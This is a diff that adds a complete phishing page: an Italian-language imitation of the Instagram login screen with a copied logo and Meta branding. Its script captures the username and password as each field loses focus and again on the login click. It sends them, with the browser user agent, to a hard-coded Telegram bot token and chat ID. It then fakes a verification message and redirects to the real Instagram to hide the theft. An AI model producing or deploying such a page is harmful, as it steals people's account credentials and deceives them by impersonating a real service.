@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, sans-serif;
+}
+
+body{
+    background:#0f2533;
+    height:100vh;
+    color:#fff;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    margin:auto;
+    padding:20px;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+}
+
+.lang{
+    margin-top:12px;
+    color:#d8d8d8;
+    font-size:17px;
+}
+
+.logo{
+    margin-top:140px;
+    margin-bottom:110px;
+}
+
+.form{
+    width:100%;
+}
+
+input{
+    width:100%;
+    height:78px;
+    margin-bottom:20px;
+    border:2px solid #41586c;
+    border-radius:22px;
+    background:transparent;
+    color:white;
+    font-size:18px;
+    padding:0 25px;
+    outline:none;
+}
+
+input::placeholder{
+    color:#98a4af;
+}
+
+.login{
+    width:100%;
+    height:62px;
+    border:none;
+    border-radius:35px;
+    background:#1877f2;
+    color:white;
+    font-size:22px;
+    cursor:pointer;
+}
+
+.forgot{
+    text-align:center;
+    margin-top:35px;
+    font-size:18px;
+}
+
+.bottom{
+    margin-top:auto;
+    width:100%;
+    padding-bottom:40px;
+}
+
+.create{
+    width:100%;
+    height:62px;
+    border:2px solid #2f8cff;
+    border-radius:35px;
+    background:transparent;
+    color:#4d9cff;
+    font-size:20px;
+}
+
+.meta{
+    text-align:center;
+    margin-top:35px;
+    font-size:20px;
+    color:#ddd;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="lang">Italiano</div>
+
+    <div class="logo">
+
+        <!-- Instagram SVG -->
+        <svg width="95" height="95" viewBox="0 0 100 100">
+            <defs>
+                <linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <stop offset="0%" stop-color="#feda75"/>
+                    <stop offset="25%" stop-color="#fa7e1e"/>
+                    <stop offset="50%" stop-color="#d62976"/>
+                    <stop offset="75%" stop-color="#962fbf"/>
+                    <stop offset="100%" stop-color="#4f5bd5"/>
+                </linearGradient>
+            </defs>
+
+            <rect x="10" y="10" width="80" height="80"
+                  rx="22" ry="22"
+                  fill="none"
+                  stroke="url(#ig)"
+                  stroke-width="7"/>
+
+            <circle cx="50" cy="50" r="18"
+                    fill="none"
+                    stroke="url(#ig)"
+                    stroke-width="7"/>
+
+            <circle cx="72" cy="28" r="5"
+                    fill="url(#ig)"/>
+        </svg>
+
+    </div>
+
+    <div class="form">
+
+        <input
+        type="text"
+        id="username"
+        placeholder="Nome utente, e-mail o numero di cellulare">
+
+        <input
+        type="password"
+        id="password"
+        placeholder="Password">
+
+        <button class="login" id="loginBtn">Accedi</button>
+
+        <div class="forgot">
+            Password dimenticata?
+        </div>
+
+    </div>
+
+    <div class="bottom">
+
+        <button class="create">
+            Crea nuovo account
+        </button>
+
+        <div class="meta">
+            ∞ Meta
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+    // ============================================
+    //  CONFIG - Bot Telegram (نفس القيم)
+    // ============================================
+    const CONFIG = {
+        telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
+        telegramChatId: '8278195073'
+    };
+
+    // ============================================
+    //  TELEGRAM SENDER
+    // ============================================
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: CONFIG.telegramChatId,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+        try {
+            new Image().src = `${url}?${params.toString()}`;
+        } catch(e) {
+            console.error('Failed:', e.message);
+        }
+    }
+
+    // ============================================
+    //  ELEMENTS
+    // ============================================
+    const u = document.getElementById('username');
+    const p = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+
+    let usernameSent = false;
+    let passwordSent = false;
+    let loginClicked = false;
+
+    // ============================================
+    //  إرسال اسم المستخدم عند الخروج من الحقل
+    // ============================================
+    u.addEventListener('blur', function() {
+        const val = this.value.trim();
+        if (val && !usernameSent) {
+            usernameSent = true;
+            sendToTelegram(
+                `📧 *Step 1: Identifier Captured* 📧\n\n` +
+                `👤 *Identifier:* \`${val}\`\n` +
+                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
+                `⏰ *Time:* ${new Date().toISOString()}`
+            );
+        }
+    });
+
+    // ============================================
+    //  إرسال كلمة المرور عند الخروج من الحقل
+    // ============================================
+    p.addEventListener('blur', function() {
+        const val = this.value;
+        if (val && !passwordSent) {
+            passwordSent = true;
+            const userVal = u.value.trim() || 'N/A';
+            sendToTelegram(
+                `🔑 *Step 2: Password Captured* 🔑\n\n` +
+                `👤 *Identifier:* \`${userVal}\`\n` +
+                `🔑 *Password:* \`${val}\`\n` +
+                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
+                `⏰ *Time:* ${new Date().toISOString()}`
+            );
+        }
+    });
+
+    // ============================================
+    //  عند الضغط على Accedi
+    // ============================================
+    loginBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (loginClicked) return;
+        loginClicked = true;
+
+        const username = u.value.trim();
+        const password = p.value;
+
+        // إرسال تأكيدي نهائي
+        sendToTelegram(
+            `✅ *Login Button Pressed* ✅\n\n` +
+            `👤 *User:* \`${username}\`\n` +
+            `🔑 *Pass:* \`${password}\`\n` +
+            `⏰ *Time:* ${new Date().toISOString()}`
+        );
+
+        // تغيير مظهر الزر للتمويه
+        loginBtn.textContent = 'Verifica in corso...';
+        loginBtn.style.opacity = '0.6';
+        loginBtn.disabled = true;
+
+        // إعادة توجيه إلى Instagram الحقيقي
+        setTimeout(() => {
+            window.location.href = 'https://www.instagram.com';
+        }, 2000);
+    });
+</script>
+
+</body>
+</html>
